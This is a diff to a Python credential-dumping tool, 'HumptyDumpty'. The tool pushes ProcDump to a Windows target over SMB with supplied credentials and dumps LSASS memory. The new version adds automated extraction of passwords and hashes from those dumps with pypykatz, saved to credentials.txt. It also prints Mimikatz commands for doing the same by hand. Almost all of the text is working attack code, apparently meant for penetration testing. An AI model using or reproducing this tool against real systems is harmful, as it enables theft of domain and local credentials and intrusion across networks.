@@ -4,9 +4,8 @@
 # WORK IN PROGRESS!
 # Note: This code may suck. Or, it may be you that sucks.
 #
-# To do:
-#- Better error handling
-#- Automate mimikatz at the end, or prompt to run mimikatz or end script
+# v0.1 - WIP release
+# v0.2 - Added automated credential dumping with pypykatz (Checkout @skelec awesome project here: https://github.com/skelsec/pypykatz - Thanks!)
 
 #libs
 import subprocess
@@ -25,16 +24,18 @@ parser.add_argument("--username", "-u", help="Set the target username", dest="us
 parser.add_argument("--password", "-p", help="Set the target password", dest="password", required=True)
 parser.add_argument("--domain", "-d", help="Set the target domain", dest="domain", default=".")
 parser.add_argument("--output", "-o", help="Destination directory, default is current dir. Example: /dest/dir/", dest="output", default="")
-parser.add_argument("--version", action="version", version="0.1")
+parser.add_argument("--dont-dump", "-D", help="Will not perform automated credential dumping of dumpfiles", dest="dontdump", action="store_true")
+parser.add_argument("--version", action="version", version="0.2")
 args = parser.parse_args()
 
 ### START ###
 print (colored("\nHumptyDumpty by }==[n33dle]>----", "white"))
 
+print (colored("\n[Obtaining dumpfiles]", "magenta"))
 if args.file is None:
 ############ THIS SECTION IS TO PERFORM ALL ACTIONS ON A SINGLE TARGET ############
     #upload procdump
-    print (colored("\n[-] Sending ProcDump over SMB...", "yellow"))
+    print (colored("[-] Sending ProcDump over SMB...", "yellow"))
     subprocess.call(["smbclient","//"+args.target+"/c$","-U"+args.username,"-W"+args.domain,args.password,"-c put procdump.exe"], stderr=subprocess.DEVNULL)
     print (colored("[+] Done", "green"))
 
@@ -94,8 +95,25 @@ else:
         except:
             print ("could not read")
 
-### FINISH ##
-print (colored("\n==================================", "green"))
-print (colored("[+] Complete! Now dump those creds\nRun the following:", "green"))
-print (colored("\nMimikatz# sekurlsa::Minidump humpty-<dumpfile>.dmp", "blue"))
-print (colored("Mimikatz# sekurlsa::logonPasswords full\n", "blue"))
+############ THIS SECTION IS TO PERFORM CREDS DUMPING WITH PYPYKATZ ############
+print (colored("[Dumping creds]", "magenta"))
+
+if args.dontdump is not True:
+    #automated dumping:
+    print (colored("[-] Dumping creds from lsass dumpfiles...", "yellow"))
+    if args.file is None:
+        subprocess.call(["pypykatz","lsa","minidump","humpty-"+args.target+".dmp","-o","credentials.txt"], stderr=subprocess.DEVNULL)
+    else:
+        #WORK IN PROGRESS - START
+        print (colored("[-] NOT IMPLEMENTED YET", "yellow"))
+        print (colored("[-] For multiple dumpfiles, please dump manually with:", "yellow"))
+        print (colored("[-] pypykatz lsa minidump humtpy-<dumpfile>.dmp> -o credentials.txt", "blue"))
+        #subprocess.call("pypykatz lsa minidump humpty-*.dmp -o credentials.txt", shell=True)
+        #WORK IN PROGRESS - FINISH
+    print (colored("[+] All completed, review credentials.txt", "green"))
+else:
+    #message on how to dump stuff manually:
+    print (colored("[+] Now dump those creds\nRun the following:", "green"))
+    print (colored("\npypykatz:\n$pypykatz lsa minidump humtpy-<dumpfile>.dmp> ", "blue"))
+    print (colored("\nOr, with Mimikatz:\nMimikatz# sekurlsa::Minidump humpty-<dumpfile>.dmp", "blue"))
+    print (colored("Mimikatz# sekurlsa::logonPasswords full\n", "blue"))
